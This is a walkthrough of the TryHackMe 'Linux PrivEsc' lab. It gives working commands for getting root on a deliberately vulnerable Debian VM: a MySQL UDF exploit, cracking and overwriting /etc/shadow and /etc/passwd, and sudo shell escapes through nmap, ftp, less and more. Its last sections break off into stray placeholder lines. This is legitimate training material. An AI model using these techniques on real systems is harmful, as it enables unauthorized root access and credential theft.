# Linux PrivEsc

**Room Link:** [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)



## Deploy the Vulnerable Debian VM

**Kali**

```
ssh user@$VICTIM
Password: password321
```

## Service Exploits

**Victim**

```
cd /home/user/tools/mysql-udf
```

Compile the raptor\_udf2.c exploit code using the following commands

**Victim**

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password

**Victim**

```
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit.

**Victim - mysql**

```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission.

**Victim - mysql**

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges.

**Victim**

```
/tmp/rootbash -p
whoami
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user. Note that the /etc/shadow file on the VM is world-readable.

**Victim**

```
ls -l /etc/shadow
```

View the contents of the /etc/shadow file.

**Victim**

```
cat /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali.

**Kali**

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<figure><img src="../../.gitbook/assets/image (1) (12).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Writable /etc/shadow

Note that the /etc/shadow file on the VM is world-writable

**Victim**

```
ls -l /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Generate a new password hash with a password of your choice.

**Victim**

```
mkpasswd -m sha-512 newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Comment out the old one and add our output as the hash.

**Victim**

```
vi /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su root
Password: newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

## Weak File Permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there. Note that the /etc/passwd file is world-writable.

**Victim**

```
ls -l /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Generate a new password hash with a password of your choice.

**Victim**

```
openssl passwd newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x"). Switch to the root user, using the new password

**Victim**

```
vi /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su root
Password: newpasswordhere
```

<figure><img src="../../.gitbook/assets/image (10) (4).png" alt=""><figcaption></figcaption></figure>

## Sudo - Shell Escape Sequences

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

### apache2

We can use apache2 to read files and crack hashes.

**Victim**

```
sudo apache2 -f /etc/shadow
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

### **nmap**

#### **Option 1**

**Victim**

```
sudo nmap --interactive
nmap> !sh
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

#### **Option 2**

**Victim**

```
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### ftp

**Victim**

```
sudo ftp
ftp> !/bin/sh
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## **more**

Need to enter the second command while scrolling through the output.

**Victim**

```
TERM= sudo more /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### **less**

#### **Option 1**

**Victim**

```
sudo less /etc/profile
!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

This option did not work on this box as when you click v it opens nano instead of vi or vim. If you can someone set the environment variables VISUAL and/or EDITOR, you could get this to work but it would be difficult.

#### **Option 2**

**Victim**

```
export VISUAL=vi
export EDITOR=vi
echo 'export EDITOR=vim' >> ~/.bash_profile
echo 'export VISUAL=vim' >> ~/.bash_profile
sudo less /etc/profile
v
:shell
```

#### **Option 3**

**Victim**

```
VISUAL="/bin/sh -c '/bin/sh'" sudo less /etc/profile
v
```

**Victim**

```
s
```

## Sudo - Environment Variables

**Victim**

```
z
```

**Victim**

```
z
```
